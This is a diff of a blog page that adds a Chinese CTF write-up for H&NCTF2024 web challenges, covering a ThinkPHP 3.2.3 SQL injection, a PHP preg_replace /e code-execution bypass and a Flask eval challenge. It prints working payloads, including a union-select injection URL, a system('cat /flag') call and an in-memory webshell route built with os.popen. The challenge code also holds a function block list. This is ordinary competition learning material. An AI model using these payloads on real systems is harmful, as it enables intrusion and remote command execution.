@@ -18,17 +18,35 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="阿巴阿巴">
+        <meta name="description" content="ez_tp一道关于PHP框架——ThinkPHP 12&#x2F;&#x2F; 版本信息const THINK_VERSION     &#x3D;   &amp;#x27;3.2.3&amp;#x27;;  搜了一下应该就是利用SQL注入了 → 点击  但属实没看明白url是怎么一回事 康康开发手册     之后就是一个exp注入+union 1http:&#x2F;&#x2F;hnctf.imxbt.cn:23833&#x2F;index.php&#x2F;Home&#x2F;Index">
 <meta property="og:type" content="article">
 <meta property="og:title" content="H&amp;NCTF2024 web wp">
 <meta property="og:url" content="http://dawnringdong.github.io/2024/07/16/H-NCTF2024-web-wp/index.html">
 <meta property="og:site_name" content="dawn_r1sing">
-<meta property="og:description" content="阿巴阿巴">
+<meta property="og:description" content="ez_tp一道关于PHP框架——ThinkPHP 12&#x2F;&#x2F; 版本信息const THINK_VERSION     &#x3D;   &amp;#x27;3.2.3&amp;#x27;;  搜了一下应该就是利用SQL注入了 → 点击  但属实没看明白url是怎么一回事 康康开发手册     之后就是一个exp注入+union 1http:&#x2F;&#x2F;hnctf.imxbt.cn:23833&#x2F;index.php&#x2F;Home&#x2F;Index">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121736202.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121727447.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121724662.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121735039.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121742465.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121741037.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161625059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161651046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161651383.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161651057.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161652943.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405131906212.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405172200047.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161703855.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405172205830.png">
 <meta property="article:published_time" content="2024-07-16T12:06:39.000Z">
-<meta property="article:modified_time" content="2024-07-16T12:06:39.202Z">
+<meta property="article:modified_time" content="2024-07-16T12:15:14.948Z">
 <meta property="article:author" content="dawn_r1sing">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121736202.png">
     
     
     <!--- Icon Part-->
@@ -530,20 +548,55 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-07-16 20:06:39</span>
-            <span class="mobile">2024-07-16 20:06:39</span>
+            <span class="desktop">2024-07-16 20:15:14</span>
+            <span class="mobile">2024-07-16 20:15:14</span>
             <span class="hover-info">Updated</span>
         </span>
     
 
     
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
     
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>412 Words</span>
+        </span>
+    
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 Mins</span>
         </span>
     
     
@@ -562,7 +615,131 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            
+            <h3 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h3><p>一道关于PHP框架——ThinkPHP</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 版本信息</span><br><span class="line">const THINK_VERSION     =   &#x27;3.2.3&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p>搜了一下应该就是利用SQL注入了 → <a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/345544.html" >点击 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>但属实没看明白url是怎么一回事</p>
+<p>康康开发手册</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121736202.png"
+                      alt="image-20240512173649244"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121727447.png"
+                      alt="image-20240512172733034"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121724662.png"
+                      alt="image-20240512172437005"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121735039.png"
+                      alt="image-20240512173557114"
+                ></p>
+<p>之后就是一个exp注入+union</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hnctf.imxbt.cn:23833/index.php/Home/Index/h_n/?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121742465.png"
+                      alt="image-20240512174248596"
+                ></p>
+<p>但其实可以从logs里抄答案</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405121741037.png"
+                      alt="image-20240512174058395"
+                ></p>
+<h4 id="exp注入调试："><a href="#exp注入调试：" class="headerlink" title="exp注入调试："></a><strong>exp注入</strong>调试：</h4><p>解析条件语句</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161625059.png"
+                      alt="image-20240516162509878"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161651046.png"
+                      alt="image-20240516163040211"
+                ></p>
+<p>此时返回</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161651383.png"
+                      alt="image-20240516163806039"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161651057.png"
+                      alt="image-20240516164351963"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161652943.png"
+                      alt="image-20240516164626589"
+                ></p>
+<p>语句构造成功</p>
+<h3 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>利用preg_replace的&#x2F;e模式执行php语句 + &#x2F;i大写绕过 + 传参绕过</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hnctf.imxbt.cn:54186/?moran=flag&amp;a=system&amp;b=cat /flag</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task=$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])&amp;flag=please_give_me_flaG</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405131906212.png"
+                      alt="image-20240513182832087"
+                ></p>
+<h3 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405172200047.png"
+                      alt="image-20240517220030853"
+                ></p>
+<p>仅执行一次命令且在执行命令后生成flag文件</p>
+<p>先想到的是反弹bash</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405161703855.png"
+                      alt="image-20240516170351654"
+                ></p>
+<p>过滤了</p>
+<p>第二个就应该想到内存马了（之前确实没接触过。。</p>
+<p>flask的内存马 → <strong>添加后门路由</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule()</span><br></pre></td></tr></table></figure></div>
+
+<p>利用新添路由绑定木马函数 → lambda</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()</span><br></pre></td></tr></table></figure></div>
+
+<p>他的后端语句是一个很简单的eval，也没有别的过滤</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405172205830.png"
+                      alt="image-20240517220510383"
+                ></p>
+<h3 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h3><p>waiting…</p>
+
         </div>
 
         
@@ -576,7 +753,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-07-16 20:06:39
+                    :</strong> 2024-07-16 20:15:14
             </li>
         
         <li>
@@ -598,6 +775,18 @@
             </div>
         
 
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/web/">#web</a>&nbsp;
+                    </li>
+                
+            </ul>
         
 
         
@@ -676,7 +865,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">H&amp;NCTF2024 web wp</div>
-        
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-tp"><span class="nav-text">ez_tp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Please-RCE-Me"><span class="nav-text">Please_RCE_Me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezFlask"><span class="nav-text">ezFlask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flipPin"><span class="nav-text">flipPin</span></a></li></ol>
 
     </div>
 </div>
@@ -713,7 +902,7 @@
                     </span>
                     
                         <span>
-                            22.6k words in total
+                            23k words in total
                         </span>
                     
                 </p>
